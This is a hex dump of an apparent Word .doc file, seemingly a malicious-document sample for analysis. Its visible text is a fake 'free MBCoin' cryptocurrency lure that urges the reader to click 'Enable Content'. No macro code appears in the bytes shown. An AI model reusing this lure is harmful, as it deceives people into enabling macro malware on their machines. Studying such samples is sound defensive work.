00000000: d0cf 11e0 a1b1 1ae1 0000 0000 0000 0000  ................
00000010: 0000 0000 0000 0000 3e00 0300 feff 0900  ........>.......
00000020: 0600 0000 0000 0000 0000 0000 0200 0000  ................
00000030: 7e00 0000 0000 0000 0010 0000 8100 0000  ~...............
00000040: 0200 0000 feff ffff 0000 0000 7d00 0000  ............}...
00000050: 8000 0000 ffff ffff ffff ffff ffff ffff  ................
00000060: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000070: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000080: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000090: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000000a0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000000b0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000000c0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000000d0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000000e0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000000f0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000100: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000110: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000120: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000130: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000140: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000150: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000160: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000170: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000180: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000190: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000001a0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000001b0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000001c0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000001d0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000001e0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000001f0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00000200: eca5 c100 3100 0904 0000 f012 bf00 0000  ....1...........
00000210: 0000 0010 0000 0000 0008 0000 d809 0000  ................
00000220: 0e00 626a 626a b2ef b2ef 0000 0000 0000  ..bjbj..........
00000230: 0000 0000 0000 0000 0000 0000 0904 1600  ................
00000240: 6091 0000 d085 7168 d085 7168 d801 0000  `.....qh..qh....
00000250: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000260: 0000 0000 0000 0000 0000 0000 ffff 0f00  ................
00000270: 0000 0000 0000 0000 ffff 0f00 0000 0000  ................
00000280: 0000 0000 ffff 0f00 0000 0000 0000 0000  ................
00000290: 0000 0000 0000 0000 b700 0000 0000 4607  ..............F.
000002a0: 0000 0000 0000 4607 0000 d814 0000 0000  ......F.........
000002b0: 0000 d814 0000 0000 0000 d814 0000 0000  ................
000002c0: 0000 d814 0000 0000 0000 d814 0000 1400  ................
000002d0: 0000 0000 0000 0000 0000 ffff ffff 0000  ................
000002e0: 0000 ec14 0000 0000 0000 ec14 0000 0000  ................
000002f0: 0000 ec14 0000 0000 0000 ec14 0000 1400  ................
00000300: 0000 0015 0000 0c00 0000 ec14 0000 0000  ................
00000310: 0000 6141 0000 b401 0000 0c15 0000 0000  ..aA............
00000320: 0000 0c15 0000 0000 0000 0c15 0000 0000  ................
00000330: 0000 0c15 0000 0000 0000 0c15 0000 0000  ................
00000340: 0000 af3d 0000 0000 0000 af3d 0000 0000  ...=.......=....
00000350: 0000 af3d 0000 0000 0000 5f40 0000 8300  ...=......_@....
00000360: 0000 e240 0000 0000 0000 e240 0000 0000  ...@.......@....
00000370: 0000 e240 0000 0000 0000 e240 0000 0000  ...@.......@....
00000380: 0000 e240 0000 0000 0000 e240 0000 2400  ...@.......@..$.
00000390: 0000 1543 0000 b602 0000 cb45 0000 4800  ...C.......E..H.
000003a0: 0000 0641 0000 1500 0000 0000 0000 0000  ...A............
000003b0: 0000 0000 0000 0000 0000 d814 0000 0000  ................
000003c0: 0000 af3d 0000 0000 0000 0000 0000 0000  ...=............
000003d0: 0000 0000 0000 0000 0000 6f3d 0000 4000  ..........o=..@.
000003e0: 0000 af3d 0000 0000 0000 af3d 0000 0000  ...=.......=....
000003f0: 0000 af3d 0000 0000 0000 0641 0000 0000  ...=.......A....
00000400: 0000 0000 0000 0000 0000 d814 0000 0000  ................
00000410: 0000 d814 0000 0000 0000 0c15 0000 0000  ................
00000420: 0000 0000 0000 0000 0000 0c15 0000 6328  ..............c(
00000430: 0000 1b41 0000 1600 0000 7f3e 0000 0000  ...A.......>....
00000440: 0000 7f3e 0000 0000 0000 7f3e 0000 0000  ...>.......>....
00000450: 0000 af3d 0000 2e00 0000 d814 0000 0000  ...=............
00000460: 0000 0c15 0000 0000 0000 d814 0000 0000  ................
00000470: 0000 0c15 0000 0000 0000 5f40 0000 0000  .........._@....
00000480: 0000 0000 0000 0000 0000 7f3e 0000 0000  ...........>....
00000490: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000004a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000004b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000004c0: 0000 af3d 0000 0000 0000 5f40 0000 0000  ...=......_@....
000004d0: 0000 0000 0000 0000 0000 7f3e 0000 0000  ...........>....
000004e0: 0000 0000 0000 0000 0000 7f3e 0000 0000  ...........>....
000004f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000500: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000510: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000520: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000530: 0000 0000 0000 0000 0000 7f3e 0000 0000  ...........>....
00000540: 0000 0c15 0000 0000 0000 ffff ffff 0000  ................
00000550: 0000 80d3 5de6 c08b d801 0000 0000 0000  ....]...........
00000560: 0000 ffff ffff 0000 0000 dd3d 0000 0a00  ...........=....
00000570: 0000 7f3e 0000 0000 0000 0000 0000 0000  ...>............
00000580: 0000 4b40 0000 1400 0000 3141 0000 3000  ..K@......1A..0.
00000590: 0000 6141 0000 0000 0000 7f3e 0000 0000  ..aA.......>....
000005a0: 0000 1346 0000 0000 0000 e73d 0000 4c00  ...F.......=..L.
000005b0: 0000 1346 0000 0000 0000 7f3e 0000 0000  ...F.......>....
000005c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000005d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000005e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000005f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000600: 0000 0000 0000 0000 0000 1346 0000 0000  ...........F....
00000610: 0000 0000 0000 0000 0000 d814 0000 0000  ................
00000620: 0000 7f3e 0000 cc01 0000 af3d 0000 0000  ...>.......=....
00000630: 0000 af3d 0000 0000 0000 7f3e 0000 0000  ...=.......>....
00000640: 0000 af3d 0000 0000 0000 af3d 0000 0000  ...=.......=....
00000650: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000660: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000670: 0000 af3d 0000 0000 0000 af3d 0000 0000  ...=.......=....
00000680: 0000 af3d 0000 0000 0000 0641 0000 0000  ...=.......A....
00000690: 0000 0641 0000 0000 0000 0000 0000 0000  ...A............
000006a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000006b0: 0000 0000 0000 0000 0000 333e 0000 4c00  ..........3>..L.
000006c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000006d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000006e0: 0000 af3d 0000 0000 0000 af3d 0000 0000  ...=.......=....
000006f0: 0000 af3d 0000 0000 0000 6141 0000 0000  ...=......aA....
00000700: 0000 af3d 0000 0000 0000 af3d 0000 0000  ...=.......=....
00000710: 0000 af3d 0000 0000 0000 af3d 0000 0000  ...=.......=....
00000720: 0000 0000 0000 0000 0000 ffff ffff 0000  ................
00000730: 0000 ffff ffff 0000 0000 ffff ffff 0000  ................
00000740: 0000 0000 0000 0000 0000 ffff ffff 0000  ................
00000750: 0000 ffff ffff 0000 0000 ffff ffff 0000  ................
00000760: 0000 ffff ffff 0000 0000 ffff ffff 0000  ................
00000770: 0000 ffff ffff 0000 0000 ffff ffff 0000  ................
00000780: 0000 ffff ffff 0000 0000 ffff ffff 0000  ................
00000790: 0000 ffff ffff 0000 0000 ffff ffff 0000  ................
000007a0: 0000 ffff ffff 0000 0000 ffff ffff 0000  ................
000007b0: 0000 ffff ffff 0000 0000 1346 0000 0000  ...........F....
000007c0: 0000 af3d 0000 0000 0000 af3d 0000 0000  ...=.......=....
000007d0: 0000 af3d 0000 0000 0000 af3d 0000 0000  ...=.......=....
000007e0: 0000 af3d 0000 0000 0000 af3d 0000 0000  ...=.......=....
000007f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000800: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000810: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000820: 0000 0000 0000 0000 0000 af3d 0000 0000  ...........=....
00000830: 0000 af3d 0000 0000 0000 af3d 0000 0000  ...=.......=....
00000840: 0000 4607 0000 580c 0000 9e13 0000 3a01  ..F...X.......:.
00000850: 0000 0500 1201 0000 0904 0000 0000 0000  ................
00000860: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000870: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000880: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000890: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000008a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000008b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000008c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000008d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000008e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000008f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000900: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000910: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000920: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000930: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000940: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000950: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000960: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000970: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000980: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000990: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000009a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000009b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000009c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000009d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000009e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000009f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000a00: 0808 0d09 090d 0d0d 0d48 656c 6c6f 2c0d  .........Hello,.
00000a10: 0d41 7265 2079 6f75 2077 6f6e 6465 7269  .Are you wonderi
00000a20: 6e67 2061 626f 7574 2068 6f77 2079 6f75  ng about how you
00000a30: 2063 616e 206d 616b 6520 6d6f 7265 206d   can make more m
00000a40: 6f6e 6579 2074 6872 6f75 6768 2061 2073  oney through a s
00000a50: 6d61 7274 6572 2069 6e76 6573 746d 656e  marter investmen
00000a60: 743f 2049 6620 796f 7520 6861 7665 206c  t? If you have l
00000a70: 6f6f 6b65 6420 6174 2074 6865 2070 726f  ooked at the pro
00000a80: 6669 7473 2061 7661 696c 6162 6c65 2066  fits available f
00000a90: 726f 6d20 6372 7970 746f 6375 7272 656e  rom cryptocurren
00000aa0: 6379 2061 6e64 2074 686f 7567 6874 2069  cy and thought i
00000ab0: 7420 7761 7320 746f 6f20 6c61 7465 2c20  t was too late, 
00000ac0: 6e6f 7720 6973 2079 6f75 7220 6368 616e  now is your chan
00000ad0: 6365 2e20 4765 7420 696e 206f 6e20 7468  ce. Get in on th
00000ae0: 6520 6772 6f75 6e64 2066 6c6f 6f72 2074  e ground floor t
00000af0: 6f64 6179 2077 6974 6820 7468 6520 616e  oday with the an
00000b00: 6e6f 756e 6365 6d65 6e74 206f 6620 4d42  nouncement of MB
00000b10: 436f 696e 2e20 0d0d 596f 7520 6d61 7920  Coin. ..You may 
00000b20: 6265 2065 6c69 6769 626c 6520 666f 7220  be eligible for 
00000b30: 6672 6565 204d 4243 6f69 6e21 204d 616b  free MBCoin! Mak
00000b40: 6520 7375 7265 2074 6f20 636c 6963 6b20  e sure to click 
00000b50: 9345 6e61 626c 6520 436f 6e74 656e 7494  .Enable Content.
00000b60: 2061 6e64 2074 6869 7320 646f 6375 6d65   and this docume
00000b70: 6e74 2077 696c 6c20 6361 6c63 756c 6174  nt will calculat
00000b80: 6520 686f 7720 6d75 6368 204d 4243 6f69  e how much MBCoi
00000b90: 6e20 796f 7592 7665 2077 6f6e 2e0d 0d48  n you.ve won...H
00000ba0: 6170 7079 2049 6e76 6573 7469 6e67 2074  appy Investing t
00000bb0: 6f20 7468 6520 4d6f 6f6e 2c0d 4d6f 6e6b  o the Moon,.Monk
00000bc0: 6579 2042 7573 696e 6573 7320 496e 7665  ey Business Inve
00000bd0: 7374 6d65 6e74 730d 0000 0000 0000 0000  stments.........
00000be0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000bf0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000c00: 0008 0000 0108 0000 0208 0000 0308 0000  ................
00000c10: 0408 0000 0508 0000 0608 0000 0708 0000  ................
00000c20: 0808 0000 0908 0000 0a08 0000 1008 0000  ................
00000c30: 1108 0000 1c08 0000 6408 0000 8208 0000  ........d.......
00000c40: a908 0000 be08 0000 d008 0000 d308 0000  ................
00000c50: d408 0000 fe08 0000 0009 0000 0a09 0000  ................
00000c60: 1509 0000 1609 0000 1709 0000 1809 0000  ................
00000c70: 2109 0000 2309 0000 2b09 0000 2c09 0000  !...#...+...,...
00000c80: 3009 0000 f2f2 eeea e6ee eee2 eec9 c9c9  0...............
00000c90: c9c9 c9c9 c9c9 c9b0 c9c9 c9c9 9781 6852  ..............hR
00000ca0: 5252 5252 2b16 684d 5032 0042 2a07 434a  RRRR+.hMP2.B*.CJ
00000cb0: 2800 4f4a 0300 514a 0300 5e4a 0300 614a  (.OJ..QJ..^J..aJ
00000cc0: 2800 6d48 0904 7068 ffd9 6600 7348 0904  (.mH..ph..f.sH..
00000cd0: 3115 6808 0fed 0016 6808 0fed 0042 2a07  1.h.....h....B*.
00000ce0: 434a 2800 4f4a 0300 514a 0300 5e4a 0300  CJ(.OJ..QJ..^J..
00000cf0: 614a 2800 6d48 0904 7068 ffd9 6600 7348  aJ(.mH..ph..f.sH
00000d00: 0904 2b16 682a 6ede 0042 2a07 434a 2800  ..+.h*n..B*.CJ(.
00000d10: 4f4a 0300 514a 0300 5e4a 0300 614a 2800  OJ..QJ..^J..aJ(.
00000d20: 6d48 0904 7068 ffd9 6600 7348 0904 3115  mH..ph..f.sH..1.
00000d30: 6808 0fed 0016 6813 2660 0042 2a07 434a  h.....h.&`.B*.CJ
00000d40: 2800 4f4a 0300 514a 0300 5e4a 0300 614a  (.OJ..QJ..^J..aJ
00000d50: 2800 6d48 0904 7068 ffd9 6600 7348 0904  (.mH..ph..f.sH..
00000d60: 3115 6808 0fed 0016 682a 6ede 0042 2a07  1.h.....h*n..B*.
00000d70: 434a 2000 4f4a 0300 514a 0300 5e4a 0300  CJ .OJ..QJ..^J..
00000d80: 614a 2000 6d48 0904 7068 ffd9 6600 7348  aJ .mH..ph..f.sH
00000d90: 0904 3115 6808 0fed 0016 685f 746a 0042  ..1.h.....h_tj.B
00000da0: 2a07 434a 2000 4f4a 0300 514a 0300 5e4a  *.CJ .OJ..QJ..^J
00000db0: 0300 614a 2000 6d48 0904 7068 ffd9 6600  ..aJ .mH..ph..f.
00000dc0: 7348 0904 0616 6883 71b9 0000 0616 68f0  sH....h.q.....h.
00000dd0: 00f4 0000 0616 682f 7a47 0000 0616 685f  ......h/zG....h_
00000de0: 746a 0000 1a03 6a00 0000 0016 685f 746a  tj....j.....h_tj
00000df0: 0055 0801 6d48 0004 6e48 0004 7508 0120  .U..mH..nH..u.. 
00000e00: 0008 0000 0308 0000 0608 0000 0708 0000  ................
00000e10: 0808 0000 0908 0000 1008 0000 1108 0000  ................
00000e20: 1709 0000 1809 0000 9e09 0000 9f09 0000  ................
00000e30: bc09 0000 d809 0000 fd00 0000 0000 0000  ................
00000e40: 0000 0000 00f3 0000 0000 0000 0000 0000  ................
00000e50: 0000 fd00 0000 0000 0000 0000 0000 00fd  ................
00000e60: 0000 0000 0000 0000 0000 0000 fd00 0000  ................
00000e70: 0000 0000 0000 0000 00fd 0000 0000 0000  ................
00000e80: 0000 0000 0000 fd00 0000 0000 0000 0000  ................
00000e90: 0000 00eb 0000 0000 0000 0000 0000 0000  ................
00000ea0: eb00 0000 0000 0000 0000 0000 00eb 0000  ................
00000eb0: 0000 0000 0000 0000 0000 fd00 0000 0000  ................
00000ec0: 0000 0000 0000 00fd 0000 0000 0000 0000  ................
00000ed0: 0000 0000 fd00 0000 0000 0000 0000 0000  ................
00000ee0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000ef0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000f00: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000f10: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000f20: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000f30: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000f40: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000f50: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000f60: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000f70: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000f80: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000f90: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000fa0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000fb0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000fc0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000fd0: 0000 0000 0000 0007 0000 1264 6801 0100  ...........dh...
00000fe0: 6764 f641 2000 0a00 000d c608 0002 e11e  gd.A ...........
00000ff0: 0c21 0000 6764 f000 f400 0001 0000 000d  .!..gd..........
00001000: 3009 0000 3d09 0000 4a09 0000 5009 0000  0...=...J...P...
00001010: 5109 0000 5d09 0000 5f09 0000 6009 0000  Q...]..._...`...
00001020: 6109 0000 8e09 0000 9509 0000 9c09 0000  a...............
00001030: 9d09 0000 9e09 0000 9f09 0000 ae09 0000  ................
00001040: ba09 0000 bc09 0000 bf09 0000 c509 0000  ................
00001050: cb09 0000 d709 0000 d809 0000 e9d0 b7b7  ................
00001060: b7b7 b7b7 9e9e 9eb7 85b7 6c56 6c6c 6c6c  ..........lVllll
00001070: 6c6c 0000 0000 0000 0000 0000 0000 0000  ll..............
00001080: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00001090: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000010a0: 0000 0000 0000 0000 0000 0000 2b16 6808  ............+.h.
000010b0: 0fed 0042 2a07 434a 2000 4f4a 0300 514a  ...B*.CJ .OJ..QJ
000010c0: 0300 5e4a 0300 614a 2000 6d48 0904 7068  ..^J..aJ .mH..ph
000010d0: ffd9 6600 7348 0904 3115 6808 0fed 0016  ..f.sH..1.h.....
000010e0: 6813 2660 0042 2a07 434a 2000 4f4a 0300  h.&`.B*.CJ .OJ..
000010f0: 514a 0300 5e4a 0300 614a 2000 6d48 0904  QJ..^J..aJ .mH..
00001100: 7068 ffd9 6600 7348 0904 3115 6808 0fed  ph..f.sH..1.h...
00001110: 0016 685f 746a 0042 2a07 434a 2800 4f4a  ..h_tj.B*.CJ(.OJ
00001120: 0300 514a 0300 5e4a 0300 614a 2800 6d48  ..QJ..^J..aJ(.mH
00001130: 0904 7068 ffd9 6600 7348 0904 3115 6808  ..ph..f.sH..1.h.
00001140: 0fed 0016 6808 0fed 0042 2a07 434a 2800  ....h....B*.CJ(.
00001150: 4f4a 0300 514a 0300 5e4a 0300 614a 2800  OJ..QJ..^J..aJ(.
00001160: 6d48 0904 7068 ffd9 6600 7348 0904 3115  mH..ph..f.sH..1.
00001170: 6808 0fed 0016 6813 2660 0042 2a07 434a  h.....h.&`.B*.CJ
00001180: 2800 4f4a 0300 514a 0300 5e4a 0300 614a  (.OJ..QJ..^J..aJ
00001190: 2800 6d48 0904 7068 ffd9 6600 7348 0904  (.mH..ph..f.sH..
000011a0: 3115 6808 0fed 0016 682a 6ede 0042 2a07  1.h.....h*n..B*.
000011b0: 434a 2800 4f4a 0300 514a 0300 5e4a 0300  CJ(.OJ..QJ..^J..
000011c0: 614a 2800 6d48 0904 7068 ffd9 6600 7348  aJ(.mH..ph..f.sH
000011d0: 0904 2b16 684d 5032 0042 2a07 434a 2800  ..+.hMP2.B*.CJ(.
000011e0: 4f4a 0300 514a 0300 5e4a 0300 614a 2800  OJ..QJ..^J..aJ(.
000011f0: 6d48 0904 7068 ffd9 6600 7348 0904 0016  mH..ph..f.sH....
00001200: 2c00 3190 6801 1fb0 822e 20b0 c641 21b0  ,.1.h..... ..A!.
00001210: a506 22b0 5203 2390 6e04 2490 6e04 25b0  ..".R.#.n.$.n.%.
00001220: 0000 17b0 c402 18b0 c402 0c90 c402 006e  ...............n
00001230: 1ef0 2a81 0000 12ce 40ac 6e7f 1d57 07c4  ..*.....@.n..W..
00001240: 282e d144 3f3d ff89 504e 470d 0a1a 0a00  (..D?=..PNG.....
00001250: 0000 0d49 4844 5200 0000 8200 0000 7708  ...IHDR.......w.
00001260: 0600 0000 cf5c 9857 0000 0185 6943 4350  .....\.W....iCCP
00001270: 4943 4320 7072 6f66 696c 6500 0028 917d  ICC profile..(.}
00001280: 913d 48c3 401c c55f 5b6b 452a 8276 90e2  .=H.@.._[kE*.v..
00001290: 90a1 3a59 1015 75d4 2a14 a142 a815 5a75  ..:Y..u.*..B..Zu
000012a0: 30b9 f443 68d2 90a4 b838 0aae 0507 3f16  0..Ch....8....?.
000012b0: ab0e 2ece ba3a b80a 82e0 0788 a393 93a2  .....:..........
000012c0: 8b94 f8bf a4d0 22c6 83e3 7ebc bbf7 b87b  ......"...~....{
000012d0: 07f8 eb65 a69a 1da3 80aa 5946 3a99 10b2  ...e......YF:...
000012e0: b915 21f4 8a4e 44d1 8729 0425 66ea b3a2  ..!..ND..).%f...
000012f0: 9882 e7f8 ba87 8faf 7771 9ee5 7dee cfd1  ........wq..}...
00001300: a3e4 4d06 f804 e219 a61b 16f1 3af1 e4a6  ..M.........:...
00001310: a573 de27 8eb0 92a4 109f 138f 1874 41e2  .s.'.........tA.
00001320: 47ae cb2e bf71 2e3a ece7 9911 2393 9e23  G....q.:....#..#
00001330: 8e10 0bc5 3696 db98 950c 9578 8238 a6a8  ....6......x.8..
00001340: 1ae5 fbb3 2e2b 9cb7 38ab e52a 6bde 93bf  .....+..8..*k...
00001350: 309c d796 97b8 4e73 1049 2c60 1122 04c8  0.....Ns.I,`."..
00001360: a862 0365 5888 d3aa 9162 224d fb09 0f7f  .b.eX....b"M....
00001370: d4f1 8be4 92c9 b501 468e 7954 a042 72fc  ........F.yT.Br.
00001380: e07f f0bb 5bb3 303e e626 8513 40f0 c5b6  ....[.0>.&..@...
00001390: 3f86 80d0 2ed0 a8d9 f6f7 b16d 374e 80c0  ?..........m7N..
000013a0: 3370 a5b5 fc95 3a30 fd49 7aad a5c5 8e80  3p....:0.Iz.....
000013b0: de6d e0e2 baa5 c97b c0e5 0e30 f0a4 4b86  .m.....{...0..K.
000013c0: e448 019a fe42 0178 3fa3 6fca 01fd b740  .H...B.x?.o....@
000013d0: f7aa db5b 731f a70f 4086 ba4a dd00 0787  ...[s...@..J....
000013e0: c070 91b2 d73c dedd d5de dbbf 679a fdfd  .p...<......g...
000013f0: 0082 6572 adaa bf2b 3500 0000 0662 4b47  ..er...+5....bKG
00001400: 4400 1400 1d00 2c4a 05d6 fd00 0000 0970  D.....,J.......p
00001410: 4859 7300 000b 1300 000b 1301 009a 9c18  HYs.............
00001420: 0000 0007 7449 4d45 07e6 061a 130d 22c2  ....tIME......".
00001430: 8332 e400 0000 1974 4558 7443 6f6d 6d65  .2.....tEXtComme
00001440: 6e74 0043 7265 6174 6564 2077 6974 6820  nt.Created with 
00001450: 4749 4d50 5781 0e17 0000 2000 4944 4154  GIMPW..... .IDAT
00001460: 78da d4bd 79b0 6457 75ee f9db 7b9f 21e7  x...y.dWu...{.!.
00001470: bcf3 5c55 f7d6 a42a cd03 1ad1 8410 c220  ..\U...*....... 
00001480: 212c 638c 65b0 11cf 36c2 1d18 ec0e 1cee  !,c.e...6.......
00001490: 0eec d761 dc7e 613f e30e b05f fb61 1b0f  ...a.~a?..._.a..
000014a0: c183 27cc d408 0981 2684 2434 a299 5255  ..'.....&.$4..RU
000014b0: a9aa 54c3 9d87 bc37 e7cc 33ee dd7f 9cbc  ..T....7..3.....
000014c0: 53a9 4a08 0c76 7746 9cc8 ca9b f79c 7bce  S.J..vwF......{.
000014d0: de6b 7feb 5bdf 5a7b 95c8 a7f9 b9bd a4e9  .k..[.Z{........
000014e0: bc4b 79ca ef85 309b 7fff a4df 1342 243f  .Ky...0......B$?
000014f0: 57c9 6773 9aeb 49c4 4917 8e36 5d53 89e4  W.gs..I.I..6]S..
00001500: 5a8e 05b6 6561 ad9e 6e24 6114 1146 10c7  Z...ea..n$a..F..
00001510: 3191 9468 ad31 c6bc ee73 ad7d 6f2c 0034  1..h.1...s.}o,.4
00001520: e6d4 df77 7eae 75f2 6ef4 a9af a7b5 3ee9  ...w~.u.n.....>.
00001530: 3c79 caef d73e 8b9f fd5c 593f 8f89 3ffd  <y...>...\Y?..?.
00001540: c49a 534e f4ea 3b42 773e cbce f962 d300  ..SN..;Bw>...b..
00001550: ad4d b809 375d 5f9c 6c07 abe7 6310 026c  .M..7]_.l...c..l
00001560: 21b1 6d41 2a25 c9d8 12c7 5108 21d1 91a6  !.mA*%....Q.!...
00001570: 1508 bc20 a215 4a2c 6d30 0262 23d7 26d1  ... ..J,m0.b#.&.
00001580: 1873 8a09 329b 0cee e4e7 d65a 760c e4a4  .s..2......Zv...
00001590: e754 9b0d e564 c358 7d9e b5ef 579f fbe4  .T...d.X}...W...
000015a0: 85d4 318c 9fa5 4158 fc7f e875 b201 9c3c  ..1...AX...u...<
000015b0: 406b 8620 e466 c438 0d92 08a3 1142 2446  @k. .f.8.....B$F
000015c0: 9056 1432 82ae 6c8a aeac 7da1 90c2 6db5  .V.2..l...}...m.
000015d0: cd13 9586 47bd 0952 6a74 1c23 a424 4612  ....G..Rjt.#.$F.
000015e0: 043e 7e2c 4e32 b4d5 8912 afbb 62d7 efc7  .>~,N2......b...
000015f0: 9cf2 f756 9f2f d6e6 9406 f01f f1b2 7ebe  ...V./........~.
00001600: 48a0 4fbd f24f 9e30 79ea 1521 d7ae 176f  H.O..O.0y..!...o
00001610: 9a90 5583 595f 739d bfb3 ea3a 3adf db42  ..U.Y_s....::..B
00001620: a12c 83e3 48b2 b645 77ce 61ac d7fd cb2d  .,..H..Ew.a....-
00001630: 03ce 27d2 1987 e9c5 c60b d34b a9b7 6882  ..'........K..h.
00001640: 8a6a c7d8 198b 8981 e20d e57a fbbe e945  .j.........z...E
00001650: a835 03e2 4812 7112 d477 96b2 1127 23dd  .5..H.q..w...'#.
00001660: ea83 6c46 8a35 03e8 0cb7 5e7d 3eb5 19f1  ..lF.5....^}>...
00001670: 4ebf c4cd 2603 5c1b df9f 2132 58ff b108  N...&.\...!2X...
00001680: b0fa 60bc 2e02 ac0e f4ba 2b10 9b06 68d5  ..`.......+...h.
00001690: 3056 e763 ddf0 2442 6a2c 0b1c 5792 75d4  0V.c..$Bj,..W.u.
000016a0: 605f b7fa c4bb 6ebe 90a1 e134 cf3c 3e79  `_....n....4.<>y
000016b0: fef1 997a b9d2 f089 4218 e84b f3f6 ebb7  ...z....B..K....
000016c0: 7374 b2c6 9fff cdd3 a2ed 1b74 ac11 9c7a  st.........t...z
000016d0: c5af 1a82 59c3 f8cd 88b1 8e00 728d 936c  ....Y.......r..l
000016e0: e60e a746 88ff df21 c2e9 c9e0 a991 e064  ...F...!.......d
000016f0: 0410 e224 12b8 6621 064b 0834 0681 deb0  ...$..f!.K.4....
00001700: e256 57d6 aa41 2836 5a80 e80c a865 44e7  .VW..A(6Z....eD.
00001710: 6f19 8430 0821 560f 0721 88fc 8828 8868  o..0.!V..!...(.h
00001720: b423 aa5e 4cbd aef1 235e 7032 d1f9 5108  .#.^L...#^p2..Q.
00001730: be1f 26e7 c9e4 6f5b 27cd 4fb4 7aff 9d09  ..&...o['.O.z...
00001740: 3727 7187 78ed f937 1b2a c610 6b83 c090  7'q.x..7.*..k...
00001750: dcaa 3825 42ac b99a d72c f59f 1f32 887f  ..8%B....,...2..
00001760: 4bd4 f0d3 1a82 b2c4 29a3 8055 04d8 3996  K.......)..U..9.
00001770: e577 6fd9 610e 1c2d f30f f7ce 0821 c293  .wo.a..-.....!..
00001780: 48e0 4903 7112 c954 9ace c483 b234 2957  H.I.q..T.....4)W
00001790: 914b 59f4 145c c67a 539f 1be9 736f b71d  .KY..\.zS...so..
000017a0: c1e2 8a7f 6066 d97f fb4a 399a 6afa 1169  ....`f...J9.j..i
000017b0: 57d2 9db3 d32d dfb4 e7ab 6d1a cd90 3812  W....-....m...8.
